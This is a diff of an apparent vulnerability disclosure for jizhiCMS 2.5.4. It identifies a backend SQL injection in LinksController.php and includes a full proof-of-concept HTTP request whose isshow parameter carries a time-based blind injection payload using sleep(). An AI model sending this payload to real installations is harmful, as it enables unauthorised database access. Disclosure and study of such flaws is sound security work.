@@ -8,6 +8,9 @@ The vulnerable file is located at:
 jizhicms-2.5.4/app/admin/c/LinksController.php
 This is where the backend SQL injection vulnerability exists in jizhiCMS version 2.5.4.
 Vulnerability PoC (Proof of Concept)：
+
+
+
 POST /index.php/admins/Links/addlinks/molds/links.html HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
@@ -23,6 +26,8 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/201001
 Content-Length: 47
 
 go=1&tid=1&title=qwd&url=www.baidu.com&isshow=1'and(select*from(select+sleep(6))a/**/union/**/select+1)='
+
+
 
 Vulnerability Type: Backend SQL Injection
 Affected File/Function: LinksController.php – Parameter handling for isshow
